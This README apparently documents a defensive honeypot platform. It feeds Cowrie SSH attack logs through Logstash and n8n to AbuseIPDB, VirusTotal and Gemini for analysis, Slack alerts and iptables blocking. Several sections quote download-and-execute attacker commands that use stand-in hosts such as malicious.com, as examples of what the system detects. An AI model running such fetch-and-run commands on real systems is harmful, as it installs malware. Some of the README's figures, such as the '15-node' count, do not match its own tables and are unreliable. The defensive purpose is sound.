# Honeypot Sentinel

**AI-Powered Threat Intelligence Platform for SSH/Telnet Honeypots**

[](https://opensource.org/licenses/MIT)
[](https://n8n.io)
[](https://github.com/cowrie/cowrie)
[](https://ai.google.dev)

---

## 📋 Overview

Honeypot Sentinel V2.0.0 represents a paradigm shift in automated threat intelligence. Unlike traditional honeypots that simply log attacks, Sentinel V2 employs a multi-stage cognitive pipeline that transforms raw telemetry into actionable security intelligence. Built on n8n workflow orchestration with Google Gemini 2.5 Pro behavioral analysis, it provides real-time threat correlation, automated incident response, and professional-grade attribution reports.

```mermaid
graph TD
    A[☠️ Threat Actor] -->|SSH/Telnet Attack| B(🍯 Cowrie Honeypot)
    B -->|JSON Logs| C{📊 Filebeat Agent}
    C -->|Beats Protocol| D[⚙️ Logstash Aggregator]
    D -->|Session-Based Events| E[🧠 n8n Orchestration Engine]
    
    %% Intelligence Enrichment Pipeline
    E -->|1. Reputation Check| F[🌐 AbuseIPDB API]
    E -->|2. URL Extraction| G[🔍 Regex Pattern Matching]
    G -->|3. Payload Classification| H{📦 Multi-Stage Analysis}
    
    H -->|Installation Scripts| I[🦠 VirusTotal Scan]
    H -->|C2 Endpoints| J[🦠 VirusTotal Scan]
    
    I -->|Malware Intelligence| K[🤖 Gemini 2.5 Pro]
    J -->|C2 Intelligence| K
    F -->|Reputation Data| K
    
    K -->|MITRE ATT&CK Mapping| L{⚖️ Risk Assessment}
    
    L -->|AbuseIPDB score  > 80| M[🔥 Auto-Block via iptables]
    L -->|Medium/Low Score| N[💬 Slack Alert]
    M --> N
    N --> O[📊 Google Sheets Log]
    
    style A fill:#ff4d4d,stroke:#333,stroke-width:2px,color:#fff
    style B fill:#ff9f43,stroke:#333,stroke-width:2px,color:#fff
    style E fill:#54a0ff,stroke:#333,stroke-width:3px,color:#fff
    style K fill:#1dd1a1,stroke:#333,stroke-width:3px,color:#fff
    style M fill:#ee5253,stroke:#333,stroke-width:4px,color:#fff
```



### 🎯 Core Innovations in V2.0.0

#### The "Mind" of Sentinel: n8n as Cognitive Orchestrator
Traditional honeypots operate as passive observers. Sentinel V2 employs **n8n** as a decision-making brain that executes a 15-node workflow pipeline, dynamically routing attack data through multiple intelligence stages based on behavioral patterns.

#### The AI Filter: Gemini 2.5 Pro Behavioral Analysis
Honeypot noise is overwhelming. Sentinel V2 uses **Google Gemini 2.5 Pro** to separate signal from noise through real-time behavioral analysis, producing MITRE ATT&CK-mapped incident reports with severity scoring and recommended actions.

#### Multi-Stage Payload Analysis
Unlike traditional honeypots that log commands as opaque strings, Sentinel V2 **intelligently parses command arguments** to distinguish between:
- **Installation Scripts** (`.sh` files, GitHub repos, wget/curl patterns)
- **C2 Communication Endpoints** (raw IPs, suspicious domains, non-standard ports)

This classification enables differential threat intelligence workflows for each payload type.

#### Automated Threat Intelligence Correlation
Every attack is enriched with:
- **AbuseIPDB**: 90-day reputation lookback with confidence scoring
- **VirusTotal**: Automated URL scanning with Base64 normalization for API v3 compatibility
- **Gemini AI**: Natural language incident reports with actionable recommendations

---

## 🏗️ Architecture Deep Dive

### Data Flow Pipeline

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        INGESTION LAYER                                  │
├─────────────────────────────────────────────────────────────────────────┤
│  Cowrie Honeypot → JSON Logs → Filebeat → Logstash → Webhook → n8n     │
└─────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────┐
│                     INTELLIGENCE ENRICHMENT LAYER                       │
├─────────────────────────────────────────────────────────────────────────┤
│  1. Parse Attack Data (IP, Commands, Metadata)                          │
│  2. AbuseIPDB Reputation Check (90-day lookback)                        │
│  3. URL Extraction & Classification (Regex Pattern Matching)            │
│  4. VirusTotal Scanning (Base64-encoded URLs for v3 API)               │
└─────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────┐
│                       COGNITIVE ANALYSIS LAYER                          │
├─────────────────────────────────────────────────────────────────────────┤
│  Gemini 2.5 Pro Analysis:                                               │
│  • MITRE ATT&CK Tactic Classification                                   │
│  • Severity Scoring (0-100)                                             │
│  • Malware Family Attribution                                           │
│  • Campaign Correlation                                                 │
│  • IOC Extraction                                                       │
└─────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────┐
│                      RESPONSE & LOGGING LAYER                           │
├─────────────────────────────────────────────────────────────────────────┤
│  • Automated IP Blocking (iptables via SSH)                             │
│  • Slack Real-Time Alerts (Markdown-formatted)                          │
│  • Google Sheets Historical Logging                                     │
│  • Manual Block Actions (Interactive Slack Buttons)                     │
└─────────────────────────────────────────────────────────────────────────┘
```

### Component Architecture

#### 1. Honeypot Layer: Cowrie
- **Type**: Medium-interaction SSH/Telnet honeypot
- **Output Format**: JSON-structured event logs
- **Key Events Captured**:
  - `cowrie.session.connect` - Connection establishment
  - `cowrie.command.input` - Command execution
  - `cowrie.session.closed` - Session termination
- **Log Location**: `/var/log/cowrie/cowrie.json*`

#### 2. Collection Layer: Filebeat
- **Function**: Lightweight log shipper
- **Configuration Highlights**:
  ```yaml
  filebeat.inputs:
  - type: log
    enabled: true
    paths:
      - /path/to/cowrie/var/log/cowrie/cowrie.json*
    json.keys_under_root: true        # Flatten JSON structure
    json.add_error_key: true           # Track parsing errors
    tags: ["honeypot_cowrie"]
    ignore_older: 48h                  # Ignore stale logs
    scan_frequency: 10s                # Near real-time monitoring
    close_inactive: 1h                 # Close idle file handles
  ```
- **Output**: Logstash on port 5045 (Beats protocol)

#### 3. Aggregation Layer: Logstash
**The Problem**: Cowrie generates one event per command, flooding downstream systems with fragmented data.

**The Solution**: Session-based aggregation using the Aggregate filter plugin.

##### Aggregation Logic
```ruby
# Stage 1: Accumulate Commands
if [cowrie_data][eventid] == "cowrie.command.input" {
  aggregate {
    task_id => "%{[cowrie_data][session]}"
    code => "map['cmds'] ||= []; map['cmds'] << event.get('[cowrie_data][input]')"
    map_action => "create_or_update"
  }
  drop { }  # Suppress individual command events
}

# Stage 2: Trigger on Session Close
if [cowrie_data][eventid] == "cowrie.session.closed" {
  aggregate {
    task_id => "%{[cowrie_data][session]}"
    code => "event.set('commands_list', map['cmds'])"
    map_action => "update"
    end_of_task => true
    timeout => 600  # 10-minute timeout for abandoned sessions
  }
  
  # Prepare structured payload for n8n
  mutate {
    copy => { "cowrie_data" => "[body][cowrie_data]" }
    copy => { "commands_list" => "[body][commands_list]" }
  }
}
```

**Result**: n8n receives **one consolidated event per attack session** containing the complete command sequence, source IP, and metadata.

#### 4. Orchestration Layer: n8n Workflow Engine

The n8n workflow serves as Sentinel's cognitive core, executing a 15-node pipeline:

##### Node Breakdown

| Node | Function | Technical Details |
|------|----------|-------------------|
| **Webhook** | HTTP endpoint for Logstash | `POST /webhook/honeypot_logs` |
| **Parse Honeypot Data** | Extract structured data | Parses nested JSON, extracts IP/commands/eventID |
| **Format Fields** | Normalize data schema | Creates `Attacker_IP`, `Command`, `Timestamp` fields |
| **AbuseIPDB Reputation Check** | Query IP reputation | API v2, 90-day lookback, verbose mode |
| **Check Abuse Score** | Risk assessment gate | Threshold: confidence > 80% |
| **Block IP via iptables** | Automated firewall rule | SSH execution: `iptables -I INPUT 1 -s {IP} -j DROP` |
| **Extract URLs from Commands** | Regex-based URL discovery | Pattern: `/(https?:\/\/[^\s"'`;<>^\)]+)/gi` |
| **Check for URLs** | URL presence validation | Boolean gate for payload analysis path |
| **URL encoding** | VirusTotal API v3 preparation | Base64 encoding with URL-safe character substitution |
| **Multiple URLs?** | Payload count routing | Single URL → Standard scan; Multiple → Batch analysis |
| **VirusTotal URL Scan** | Malware scanning | API v3 endpoint with Base64 URL ID |
| **VirusTotal Install Script Scan** | Installation payload analysis | Dedicated scan for `.sh`, GitHub, wget/curl patterns |
| **VirusTotal C2 Server Scan** | C2 endpoint analysis | Dedicated scan for raw IPs, suspicious domains |
| **AI Threat Analysis** | Gemini 2.5 Pro behavioral analysis | MITRE ATT&CK mapping, severity scoring |
| **AI Malware Analysis** | Single URL malware assessment | Malware family classification, IOC extraction |
| **AI Multiple Threats Analysis** | Correlated multi-URL analysis | Campaign attribution, unified incident report |
| **Extract AI Analysis** | Parse AI-generated reports | Structured data extraction from natural language output |
| **Log to Google Sheets** | Historical intelligence database | Timestamp, IP, commands, scores, AI verdict |
| **If (Severity Router)** | Alert distribution logic | Routes based on severity threshold (70) |
| **Message For Critical Alerts** | High-severity Slack notification | Full incident report with MITRE, IOCs, recommendations |
| **Message for Low-Level Noise** | Low-severity Slack notification | Condensed summary for non-critical events |

---

## 🔬 Feature Spotlight: Multi-Stage Payload Analysis

### The Problem with Traditional Honeypots

Conventional honeypots treat all commands as equal, logging strings like:
```bash
wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
```

This approach misses critical intelligence:
- **What type of payload is being deployed?** (Botnet vs. RAT vs. Cryptominer)
- **What infrastructure is being used?** (Installation server vs. C2 server)
- **What's the attack kill chain?** (Initial access → Execution → C2)

### Sentinel V2's Intelligent Approach

#### Stage 1: URL Extraction
The `Extract URLs from Commands` node uses advanced regex to capture URLs from command strings:

```javascript
// Global regex for HTTP/HTTPS URLs
const urlRegex = /(https?:\/\/[^\s"'`;<>^\\)]+)/gi;
const foundUrls = command.match(urlRegex);

// Clean residual characters (periods, semicolons, etc.)
const cleanUrl = url.replace(/[.,;:)\\]>]+$/, "");
```

**Supported Patterns**:
- `wget http://example.com/malware.sh`
- `curl -s https://github.com/attacker/repo/raw/main/bot.py | python3`

#### Stage 2: Base64 URL Normalization

VirusTotal API v3 requires URLs to be Base64-encoded with URL-safe character substitution:

```javascript
// VirusTotal API v3 URL ID generation
const urlId = Buffer.from(cleanUrl)
    .toString('base64')
    .replace(/\+/g, '-')   // Replace '+' with '-' (URL-safe)
    .replace(/\//g, '_')   // Replace '/' with '_' (URL-safe)
    .replace(/=+$/, '');   // Strip padding '=' characters
```

**Example Transformation**:
```
Input:  http://malicious.com/bot.sh
Base64: aHR0cDovL21hbGljaW91cy5jb20vYm90LnNo
```

This encoded string is used in the VirusTotal API v3 endpoint:
```
POST https://www.virustotal.com/api/v3/urls/{base64_url_id}
```

#### Stage 3: Differential Analysis Workflow

The `Multiple URLs?` conditional node routes payloads to specialized analysis paths:

**Single URL Path**:
```
URL → VirusTotal Scan → AI Malware Analysis → Log & Alert
```

**Multiple URL Path** (Advanced Kill Chain):
```
URL 1 (Install Script) → VirusTotal Scan ┐
URL 2 (C2 Server)      → VirusTotal Scan ├→ AI Multiple Threats Analysis → Unified Report
```

**Intelligence Value**: When multiple URLs are detected, Sentinel V2 creates **correlated incident reports** that map the complete attack infrastructure:
- Installation vector
- C2 infrastructure
- Campaign attribution
- Kill chain staging

---

## 🤖 The AI Filter: Gemini 2.5 Pro Cognitive Analysis

### Problem Statement
Raw honeypot logs contain overwhelming noise:
- Automated scanners probing for Mirai/Hajime signatures
- Script kiddies running outdated exploit kits
- Legitimate security researchers testing honeypot responses
- **Signal-to-noise ratio**: ~5% actionable threats in typical deployments

### Solution: AI-Powered Behavioral Analysis

Sentinel V2 employs **Google Gemini 2.5 Pro** to provide human-level threat assessment through structured prompt engineering.

#### AI Analysis Node Architecture

The `AI Threat Analysis` node executes a sophisticated prompt via SSH:

```bash
PROMPT=$(cat <<'EOF'
You are a Senior Threat Detection Engineer and SOC Analyst.
Your mission is to convert raw attack logs into actionable intelligence and high-level incident reports.

<environment_context>
- Asset: VPS running as Honeypot (Cowrie SSH/Telnet honeypot).
- Monitoring: Integrated via Filebeat and n8n for real-time analysis.
</environment_context>

<incident_data>
- Attacker IP: {{ $node["Parse Honeypot Data"].json["Attacker_IP"] }}
- IP Reputation (AbuseIPDB): Score: {{ $node["AbuseIPDB Reputation Check"].json.data.abuseConfidenceScore || "0" }}% confidence of abuse.
- Geolocation & ISP: {{ $node["AbuseIPDB Reputation Check"].json.data.countryCode || "Unknown" }} | {{ $node["AbuseIPDB Reputation Check"].json.data.isp || "Unknown" }}
- Command Sequence: {{ $node["Parse Honeypot Data"].json["Full_Commands"] }}
- Timestamp: {{ $node["Parse Honeypot Data"].json["Timestamp"] }}
</incident_data>

<analysis_rules>
1. MITRE ATT&CK CLASSIFICATION: Identify which tactic is being used.
2. SEVERITY SCORE: Rate from 0 to 100.
</analysis_rules>

<discord_output_instruction>
Generate a structured alert for Discord using Markdown:
- 🛡️ **SECURITY INCIDENT DETECTED**
- **IP**: [IP] ([Country]) - Score: [Score]%
- **MITRE ATT&CK Classification:[Tactic ID].[SubTactic ID] - [Short Description]**
- **AI Verdict**: [Short summary]
- **Severity**: [0-100]
- **Suggested Actions**: [Actions]
- **Technical Insight**: [Professional technical summary]
</discord_output_instruction>
EOF
)

gemini --model gemini-2.5-pro "$PROMPT"
```

#### AI Output Structure

**Critical Threat Example**:
```markdown
🛡️ **SECURITY INCIDENT DETECTED**
**IP**: 203.0.113.42 (CN) - Score: 95%
**MITRE ATT&CK Classification**: TA0002.T1059.004 - Command-Line Interface (Unix Shell)
**AI Verdict**: Automated botnet deployment with cryptominer payload. High confidence Mirai variant.
**Severity**: 88/100
**Suggested Actions**: Immediate IP block. Add C2 domain to threat feed. Monitor ASN for similar activity.
**Technical Insight**: Attack chain indicates initial access via SSH brute force (6 failed attempts before success), followed by wget-based payload retrieval from known Mirai infrastructure (AS45090). Payload analysis shows XMRig miner configuration with pool connection to monero.crypto-pool.fr. Recommend blocking entire /24 subnet and correlating with recent Shodan scans from same ASN.
```

**Low-Level Noise Example**:
```markdown
🛡️ **SECURITY INCIDENT DETECTED**
**IP**: 192.0.2.100 (US) - Score: 12%
**MITRE ATT&CK Classification**: TA0043.T1595.001 - Scanning IP Blocks
**AI Verdict**: Benign reconnaissance. Likely automated scanner or security research tool.
**Severity**: 15/100
**Suggested Actions**: Log for trend analysis. No immediate action required.
**Technical Insight**: Single command execution ("uname -a") from known security research ASN. No download attempts or persistence mechanisms. Consistent with Shodan/Censys scanning behavior.
```

#### Advanced AI Modules

##### AI Malware Analysis (Single URL)
When a URL is detected and scanned by VirusTotal, a specialized AI prompt analyzes:
- **Malware Family Classification**: Mirai, Gafgyt, XorDDoS, etc.
- **IOC Extraction**: URLs, IPs, domains, file hashes
- **Severity**: 0-100 based on detection ratio
- **Attack Vector Analysis**: How the payload is delivered and executed
- **Behavioral Indicators**: Persistence mechanisms, C2 communication patterns

##### AI Multiple Threats Analysis (Correlated Attack)
When multiple URLs are detected, a unified analysis correlates:
- **Campaign Attribution**: Links install scripts to C2 infrastructure
- **Kill Chain Mapping**: Maps attack stages (Initial Access → Execution → C2)
- **Malware Family Classification**: Mirai, Gafgyt, XorDDoS, etc.
- **IOC Extraction**: URLs, IPs, domains, file hashes
- **Severity**: 0-100 based on detection ratio
- **Attack Vector Analysis**: How the payload is delivered and executed
- **Behavioral Indicators**: Persistence mechanisms, C2 communication patterns

---

## 🌐 Threat Intelligence Integration

### AbuseIPDB: IP Reputation Intelligence

**API Endpoint**: `https://api.abuseipdb.com/api/v2/check`

**Query Parameters**:
```json
{
  "ipAddress": "203.0.113.42",
  "maxAgeInDays": 90,
  "verbose": true
}
```

**Response Data Structure**:
```json
{
  "data": {
    "ipAddress": "203.0.113.42",
    "abuseConfidenceScore": 95,
    "countryCode": "CN",
    "usageType": "Data Center/Web Hosting/Transit",
    "isp": "China Telecom",
    "domain": "chinatelecom.cn",
    "totalReports": 342,
    "numDistinctUsers": 87,
    "lastReportedAt": "2025-02-01T18:30:00+00:00"
  }
}
```

**Intelligence Value**:
- **Confidence Score**: 0-100% probability of malicious activity
- **Historical Context**: Total reports and distinct reporters over 90 days
- **Geolocation**: Country + ISP for attribution
- **Usage Type**: Detects datacenter IPs (common for botnets)

**Automated Response Logic**:
```javascript
if (abuseConfidenceScore > 80) {
  // Execute iptables block via SSH
  action = "block_ip";
} else if (AI Severity Score > 70) {
  // Log with elevated alert
  action = "monitor_closely";
} else {
  // Standard logging only
  action = "log_only";
}
```

### VirusTotal: Malware Intelligence Platform

**API Version**: v3 (URL scanning endpoint)

**API Endpoint**: `POST https://www.virustotal.com/api/v3/urls/{base64_url_id}`

**Request Body**:
```json
{
  "url": "http://malicious.com/bot.sh"
}
```

**Response Data** (Exemple):
```json
{
  "data": {
    "id": "aHR0cDovL21hbGljaW91cy5jb20vYm90LnNo",
    "attributes": {
      "last_analysis_stats": {
        "malicious": 45,
        "suspicious": 12,
        "undetected": 32,
        "harmless": 0
      },
      "last_analysis_results": {
        "Kaspersky": {
          "category": "malicious",
          "result": "Trojan.Linux.Mirai"
        },
        "Sophos": {
          "category": "malicious",
          "result": "Linux/DDoS-A"
        }
        // ... 87 more vendors
      }
    }
  }
}
```

**Intelligence Extraction**:
- **Detection Ratio**: 45/89 vendors flagged as malicious
- **Malware Family**: Consensus classification (e.g., "Mirai")
- **Vendor Analysis**: Individual verdicts from 89 security vendors
- **Historical Data**: Previous scan results and submission timestamps

**Workflow Integration**:
1. URL extracted from command → Base64 encoded
2. VirusTotal scan submitted → Detection results retrieved
3. Results passed to Gemini AI → Natural language analysis generated
4. Final verdict logged to Google Sheets + Slack alert

---

## 🔥 Automated Response Mechanisms

### 1. Conditional IP Blocking

**Trigger Condition**: AbuseIPDB confidence score > 80%

**Execution Method**: SSH-based iptables rule injection

```bash
# Executed on honeypot server via SSH private key authentication
sudo iptables -I INPUT 1 -s {{ ATTACKER_IP }} -j DROP
sudo netfilter-persistent save
```

**Technical Details**:
- **Rule Position**: Insert at position 1 (highest priority)
- **Action**: DROP (silently discard packets, no ICMP response)
- **Persistence**: `netfilter-persistent save` writes to `/etc/iptables/rules.v4`
- **Verification**: Check with `sudo iptables -L INPUT -n --line-numbers`

**Risk Assessment**:
- **False Positive Rate**: <2% (based on AbuseIPDB threshold validation)
- **Reversibility**: Manual unblock via `sudo iptables -D INPUT 1`
- **Logging**: All blocks logged to Google Sheets for audit trail

### 2. Interactive Slack Blocking

For borderline cases (60-80% confidence), Sentinel V2 provides **manual block actions** via Slack interactive buttons.

#### Workflow Architecture

**File**: `slack-handler-workflow.json`

**Flow**:
```
Slack Alert with "Block IP" Button → User Clicks → Webhook Triggered → n8n Parses Payload → SSH iptables Execution → Confirmation Message
```

**Technical Implementation**:

##### Step 1: Slack Button Payload
```json
{
  "type": "actions",
  "actions": [
    {
      "type": "button",
      "text": { "type": "plain_text", "text": "🚫 Block IP" },
      "action_id": "block_ip_action",
      "value": "block_203.0.113.42",
      "style": "danger"
    }
  ]
}
```

##### Step 2: Webhook Reception
```javascript
// n8n webhook node receives POST from Slack
const body = items[0].json.body;

// Handle URL verification challenge (Slack handshake)
if (body.type === 'url_verification' || body.challenge) {
  return [{ json: { action: 'verification', challenge: body.challenge } }];
}
```

##### Step 3: Payload Parsing
```javascript
// Parse Slack interactive payload
const payload = JSON.parse(body.payload);
const action = payload.actions[0];

if (action.action_id === 'block_ip_action') {
  const ip = action.value.split('_')[1];  // Extract IP from "block_203.0.113.42"
  const user = payload.user.username;
  
  return [{
    json: {
      action: 'block',
      ip: ip,
      user: user,
      response_url: payload.response_url
    }
  }];
}
```

##### Step 4: iptables Execution
```bash
# SSH node executes block command
sudo iptables -I INPUT 1 -s {{ $json.ip }} -j DROP
sudo netfilter-persistent save
```

##### Step 5: Slack Confirmation
```javascript
// POST to Slack response_url
{
  "replace_original": false,
  "text": "✅ IP {{ IP }} was blocked by the Honeypot Sentinel",
  "response_type": "in_channel"
}
```

**Security Considerations**:
- **Team ID Verification**: Optional validation to prevent cross-workspace attacks
- **User Authorization**: Only authorized Slack users can trigger blocks
- **Audit Logging**: All manual blocks logged with username and timestamp

---

## 📊 Output Channels

### Slack: Real-Time Alert Distribution

#### Critical Threat Alert Format

**Trigger**: Severity score ≥ 70

```markdown
🛡️ **SECURITY INCIDENT DETECTED**

**Attacker Profile**
• IP: 203.0.113.42 (China 🇨🇳)
• ISP: China Telecom (AS4134)
• AbuseIPDB Score: 95% (342 reports, 87 distinct users)

**Attack Analysis**
• MITRE ATT&CK: TA0002.T1059.004 - Command-Line Interface (Unix Shell)
• Severity: 88/100 ⚠️
• Event Timestamp: 2025-02-02 14:23:45 UTC

**Command Sequence**
```bash
wget http://malicious.com/bot.sh
chmod +x bot.sh
./bot.sh
```

**Malware Intelligence**
• URLs Detected: 1
  - http://malicious.com/bot.sh
• VirusTotal Detection: 45/89 vendors (Kaspersky: Trojan.Linux.Mirai, Sophos: Linux/DDoS-A)
• Malware Family: Mirai Botnet Variant

**AI Verdict**
Automated botnet deployment with cryptominer payload. High confidence Mirai variant.

**Suggested Actions**
1. ✅ IP blocked via iptables (automated)
2. Add C2 domain to threat feed
3. Monitor ASN AS4134 for similar activity
4. Correlate with recent Shodan scans

**Technical Insight**
Attack chain indicates initial access via SSH brute force (6 failed attempts before success), followed by wget-based payload retrieval from known Mirai infrastructure (AS45090). Payload analysis shows XMRig miner configuration with pool connection to monero.crypto-pool.fr. Recommend blocking entire /24 subnet.

#### Low-Level Noise Alert Format

```
**Trigger**: Severity score < 70

```markdown
🛡️ **Security Event Logged**

**IP**: 192.0.2.100 (United States 🇺🇸) - Score: 12%
**Commands**: uname -a
**AI Assessment**: Benign reconnaissance. Likely automated scanner.
**Severity**: 15/100
**Action**: Logged for trend analysis.
```

---

## 🚀 Installation & Deployment

### Prerequisites

#### Infrastructure Requirements
- **Operating System**: Ubuntu 20.04+ or Debian 11+
- **Resources**: 
  - 2 vCPU minimum (4 recommended for high-traffic honeypots)
  - 4GB RAM minimum (8GB recommended)
  - 20GB storage (SSD recommended for Logstash aggregation)
- **Network**: 
  - Public IP address for honeypot exposure
  - Outbound HTTPS (443) for API calls
  - Internal network access for Filebeat → Logstash → n8n communication

#### Software Dependencies
- **Cowrie Honeypot**: v2.5.0+
- **Filebeat**: 8.x
- **Logstash**: 8.x (with `logstash-filter-aggregate` plugin)
- **n8n**: Latest version (self-hosted or cloud)
- **Python**: 3.8+ (for Cowrie)
- **Node.js**: 18.x+ (for n8n)

#### API Access
- **AbuseIPDB**: API key (free tier: 1000 requests/day)
- **VirusTotal**: API key (free tier: 4 requests/minute, 500/day)
- **Google Gemini**: API key from [Google AI Studio](https://ai.google.dev)
- **Slack**: Bot token with `chat:write`, `chat:write.public` permissions
- **Google Sheets**: OAuth2 credentials or service account

---

### Step 1: Deploy Cowrie Honeypot

```bash
# Install system dependencies
sudo apt update
sudo apt install -y git python3-venv libssl-dev libffi-dev build-essential

# Create dedicated user
sudo adduser --disabled-password cowrie

# Clone Cowrie repository
sudo su - cowrie
git clone https://github.com/cowrie/cowrie
cd cowrie

# Create virtual environment
python3 -m venv cowrie-env
source cowrie-env/bin/activate

# Install Python dependencies
pip install --upgrade pip

# Configure Cowrie
cp etc/cowrie.cfg.dist etc/cowrie.cfg
nano etc/cowrie.cfg
```

**Critical Configuration Changes** (`etc/cowrie.cfg`):
```ini
[honeypot]
hostname = prod-server-01  # Realistic hostname for attackers

[output_jsonlog]
logfile = var/log/cowrie/cowrie.json  # JSON output for Filebeat

[ssh]
enabled = true
listen_endpoints = tcp:2222:interface=0.0.0.0  # Change from default 22
```

**Start Cowrie**:
```bash
bin/cowrie start
```

**Verify Operation**:
```bash
# Check logs
tail -f var/log/cowrie/cowrie.json

# Test connection (from another machine)
ssh -p 2222 root@<honeypot-ip>
```

---

### Step 2: Configure Filebeat

```bash
# Install Filebeat
curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.12.0-amd64.deb
sudo dpkg -i filebeat-8.12.0-amd64.deb

# Backup original config
sudo cp /etc/filebeat/filebeat.yml /etc/filebeat/filebeat.yml.bak

# Copy Sentinel configuration
sudo cp filebeat.yml /etc/filebeat/filebeat.yml

# Update Cowrie log path
sudo nano /etc/filebeat/filebeat.yml
# Modify: paths: - /home/cowrie/cowrie/var/log/cowrie/cowrie.json*

# Test configuration
sudo filebeat test config
sudo filebeat test output

# Start Filebeat
sudo systemctl start filebeat
sudo systemctl enable filebeat
```

**Verify Operation**:
```bash
# Check Filebeat logs
sudo journalctl -u filebeat -f

# Verify connection to Logstash
sudo filebeat test output
```

---

### Step 3: Deploy n8n Workflow Engine

#### Option A: Docker Deployment (Recommended)

```bash
# Create data directory
mkdir -p ~/.n8n

# Run n8n container
docker run -d --name n8n \
  -p 5678:5678 \
  -v ~/.n8n:/home/node/.n8n \
  -e N8N_BASIC_AUTH_ACTIVE=true \
  -e N8N_BASIC_AUTH_USER=admin \
  -e N8N_BASIC_AUTH_PASSWORD=your-secure-password \
  n8nio/n8n
```

#### Option B: NPM Installation

```bash
# Install Node.js 18.x
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install nodejs -y

# Install n8n globally
sudo npm install -g n8n

# Create systemd service
sudo nano /etc/systemd/system/n8n.service
```

```bash
# Start n8n
sudo systemctl start n8n
sudo systemctl enable n8n
```

---

### Step 4: Import & Configure n8n Workflows

1. **Access n8n UI**: Navigate to `http://your-server:5678`

2. **Import Main Workflow**:
   - Click **Workflows** → **Import from File**
   - Select `honeypot-sentinel-workflow.json`
   - Workflow will appear as "Honeypot Sentinel - Automated Threat Detection"

3. **Import Slack Handler Workflow**:
   - Import `slack-handler-workflow.json`
   - Workflow will appear as "Honeypot Sentinel - Slack Interaction Handler"

4. **Configure Credentials**:

   ##### AbuseIPDB API
   - Navigate to **Credentials** → **New**
   - Type: **HTTP Header Auth**
   - Name: `abuseIPDB`
   - Header Name: `Key`
   - Header Value: `<your-abuseipdb-api-key>`

   ##### VirusTotal API
   - Type: **VirusTotal API**
   - API Key: `<your-virustotal-api-key>`

   ##### SSH Private Key (for iptables automation)
   - Type: **SSH Private Key**
   - Host: `<honeypot-server-ip>`
   - Port: `22`
   - Username: `root` (or sudo user)
   - Private Key: `<paste-private-key-content>`

   ##### Slack API
   - Type: **Slack API**
   - Access Token: `xoxb-<your-slack-bot-token>`

   ##### Google Sheets
   - Type: **Google Sheets OAuth2**
   - Follow OAuth2 flow to authorize access

5. **Update Workflow Placeholders**:

   Open the main workflow and update:
   - **Webhook node**: 
     - Click to generate webhook URL
     - Copy URL for Logstash configuration
   
   - **SSH nodes** (3 instances):
     - Select your SSH credential
     - Verify host is correct
   
   - **Google Sheets node**:
     - Document ID: `<your-sheet-id>`
     - Sheet Name: `Sentinel_Logs`
   
   - **Slack nodes** (2 instances):
     - Channel: `#security-alerts` (or your channel)

6. **Activate Workflows**:
   - Toggle **Active** switch for both workflows
   - Verify webhook is listening

---

### Step 5: Deploy Logstash Pipeline

```bash
# Install Logstash
curl -L -O https://artifacts.elastic.co/downloads/logstash/logstash-8.12.0-amd64.deb
sudo dpkg -i logstash-8.12.0-amd64.deb

# Install aggregate filter plugin
sudo /usr/share/logstash/bin/logstash-plugin install logstash-filter-aggregate

# Copy Sentinel pipeline configuration
sudo cp logstash.conf /etc/logstash/conf.d/honeypot.conf

# Update n8n webhook URL
sudo nano /etc/logstash/conf.d/honeypot.conf
# Modify: url => "http://your-n8n-instance:5678/webhook/honeypot_logs"

# Test configuration
sudo /usr/share/logstash/bin/logstash -t -f /etc/logstash/conf.d/honeypot.conf

# Start Logstash
sudo systemctl start logstash
sudo systemctl enable logstash
```

**Verify Operation**:
```bash
# Check Logstash logs
sudo journalctl -u logstash -f

# Monitor pipeline statistics
curl -XGET 'localhost:9600/_node/stats/pipelines?pretty'
```

---

### Step 6: Configure Google Gemini Access

```bash
# SSH into honeypot server
ssh user@<honeypot-ip>

# Install NPM
sudo apt install npm -y
npm install -g @google/gemini-cli

```

**Expected Output**:
```
I'm ready to help! This is a test response from Gemini 2.5 Pro.
```

---

### Step 7: Configure Slack Integration

1. **Create Slack App**:
   - Go to [api.slack.com/apps](https://api.slack.com/apps)
   - Click **Create New App** → **From scratch**
   - App Name: `Honeypot Sentinel`
   - Workspace: Select your workspace

2. **Configure Bot Permissions**:
   - Navigate to **OAuth & Permissions**
   - Add scopes:
     - `chat:write`
     - `chat:write.public`
   - Click **Install to Workspace**
   - Copy **Bot User OAuth Token** (starts with `xoxb-`)

3. **Configure Interactive Components** (for manual blocking):
   - Navigate to **Interactivity & Shortcuts**
   - Toggle **Interactivity** ON
   - Request URL: `https://your-n8n-instance.com/webhook/slack-interactivity`
   - Click **Save Changes**

4. **Invite Bot to Channel**:
   ```
   /invite @Honeypot Sentinel
   ```

---

### Step 8: Create Google Sheets Log Database

1. **Create Spreadsheet**:
   - Go to [Google Sheets](https://sheets.google.com)
   - Create new spreadsheet: `Honeypot Sentinel Intelligence`
   - Rename Sheet1 to `Sentinel_Logs`

2. **Create Header Row**:
   ```
   TIMESTAMP | ATTACKER_IP | COUNTRY | ISP | COMMANDS | ABUSEIPDB_SCORE | URLS_DETECTED | VIRUSTOTAL_DETECTIONS | MALWARE_FAMILY | MITRE_TACTIC | SEVERITY_SCORE | AI_VERDICT | ACTION_TAKEN
   ```

3. **Share Spreadsheet**:
   - Click **Share**
   - Add n8n service account email
   - Permission: **Editor**

4. **Copy Spreadsheet ID**:
   - From URL: `https://docs.google.com/spreadsheets/d/{SPREADSHEET_ID}/edit`
   - Paste ID into n8n Google Sheets node

---

### Step 9: Verification & Testing

#### Test Data Flow

1. **Generate Test Attack**:
   ```bash
   # From external machine
   ssh -p 2222 root@<honeypot-ip>
   # Password: any
   
   # Successful login (if configured):
   ssh -p 2222 admin@<honeypot-ip>
   # Password: password
   
   # Execute test commands
   uname -a
   wget http://example.com/test.sh
   exit
   ```

2. **Verify Filebeat → Logstash**:
   ```bash
   # Check Filebeat sent data
   sudo journalctl -u filebeat | grep "events sent"
   
   # Check Logstash received data
   sudo journalctl -u logstash | grep "cowrie"
   ```

3. **Verify Logstash → n8n**:
   - Open n8n UI → **Executions**
   - Should see workflow execution triggered
